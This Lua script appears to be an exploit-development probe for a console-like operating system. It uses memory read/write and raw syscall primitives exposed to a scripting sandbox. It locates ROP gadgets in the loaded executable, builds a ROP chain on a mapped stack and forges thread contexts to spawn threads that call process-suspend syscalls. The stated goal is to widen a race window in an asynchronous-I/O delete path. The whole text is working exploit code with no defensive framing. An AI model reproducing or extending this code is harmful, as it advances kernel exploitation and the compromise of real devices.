-- CRASH_CLASS: HIGH
-- PROBE 886a: can `561` stop one thread while the rest of the process keeps running?
-- If it can, it replaces preemption for the aio window: stop the deleting thread inside
-- 662 and let a second caller run the delete.  Three shapes, each from a child so a
-- return-to-caller wedge cannot take the Lua thread with it.  The parent prints a
-- marker after each stage: if the marker appears, only the child was affected.
print("=== PROBE 886a: suspend_process from a child ===")
local function to_num(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    if type(v)=="table" and v.h then return v.h*4294967296+v.l end
    return tonumber(v) or 0
end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function rd(a) local o,v=pcall(function() return memory.read_dword(a) end); if o then return to_num(v) end end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function zero(a,n) pcall(function() for i=0,n-4,4 do memory.write_dword(a+i,0) end end) end
local fn=to_num(syscall.pipe.fn_addr)
local pid=to_num(native.fcall_with_rax(syscall.pipe.fn_addr,20))
print("[0] pid=" .. tostring(pid))
local info=memory.alloc(0x200); wd(info,0x160)
pcall(function() mk(593)(uint64(0),uint64(info)) end)
local ebase=(rd(info+0x10C) or 0)*4294967296+(rd(info+0x108) or 0)
local function find_pat(base,limit,pat)
    local off=0
    while off<limit do local want=limit-off; if want>0x1000 then want=0x1000 end
        local ok,s=pcall(function() return memory.read_buffer(base+off,want) end)
        if not ok or type(s)~="string" then return nil end
        local i=string.find(s,pat,1,true); if i then return base+off+i-1 end
        off=off+want end
end
local rad=string.char(0x58,0xC3); local rdi=string.char(0x5F,0xC3)
local pop_rax=find_pat(ebase,0x494000,rad)
local pop_rdi=find_pat(ebase,0x494000,rdi)
print(string.format("[0] eboot=%08X poprax=%s poprdi=%s", ebase, tostring(pop_rax), tostring(pop_rdi)))
if not (pop_rax and pop_rdi) then return end
local page=0x4000; local STACK=page*8
local function mmap(px) local _,a=pcall(function() return mk(477)(uint64(0),uint64(px),uint64(3),uint64(0x1002),uint64(0xFFFFFFFF),uint64(0)) end); local v=to_num(a); if v~=0 then zero(v,px) end; return v end
local Ctx={MAGIC=0x108,TYPE=0x110,CS=0x0C0,RIP=0x0E0,RSP=0x0F8,SS=0x100,RDI=0x048,RSI=0x050,RDX=0x058,RAX=0x078}
local ts=memory.alloc(16)
local function sleep_ms(ms) wq(ts,0); wq(ts+8,ms*1000000); pcall(function() mk(240)(uint64(ts),uint64(0)) end) end
-- one child: pops -> pad -> fn (call) -> thr_exit
local function child(num,arg)
    local block=mmap(STACK); if block==0 then return "nomem" end
    local start=block+STACK-0x800
    local w={}
    w[1]=pop_rdi; w[2]=arg; w[3]=pop_rax; w[4]=num
    for k=1,48 do w[5+2*(k-1)]=pop_rdi; w[6+2*(k-1)]=0 end
    local at=5+2*48
    w[at]=fn
    w[at+1]=pop_rdi; w[at+2]=0; w[at+3]=pop_rax; w[at+4]=431; w[at+5]=fn
    for i=1,#w do wq(start+8*(i-1),uint64(w[i])) end
    local ctx=memory.alloc(0x500); zero(ctx,0x500)
    wq(ctx+Ctx.MAGIC,uint64(0x480)); wq(ctx+Ctx.TYPE,uint64(0x10000))
    wq(ctx+Ctx.CS,uint64(0x43)); wq(ctx+Ctx.SS,uint64(0x3B))
    wq(ctx+Ctx.RIP,uint64(fn)); wq(ctx+Ctx.RSP,uint64(start))
    wq(ctx+Ctx.RDI,uint64(arg)); wq(ctx+Ctx.RAX,uint64(num))
    local tb=memory.alloc(8); wq(tb,uint64(0))
    local ok,rv=pcall(function() return mk(430)(uint64(ctx),uint64(tb),uint64(0)) end)
    if ok and to_num(rv)==0 then return true, to_num(rd(tb)) end
    return "spawn-fail"
end
for _,st in ipairs({{561,0,"561(0)"},{561,pid,"561(pid)"},{562,0,"562(0)"},{562,pid,"562(pid)"}}) do
    local ok,tid=child(st[1],st[2])
    print(string.format("[A] %s -> spawn=%s tid=%s", st[3], tostring(ok), tostring(tid)))
    sleep_ms(150)
    print(string.format("[B] after %s: parent alive", st[3]))
end
print("[Z] alive pid=" .. tostring(to_num(native.fcall_with_rax(syscall.pipe.fn_addr,20))))
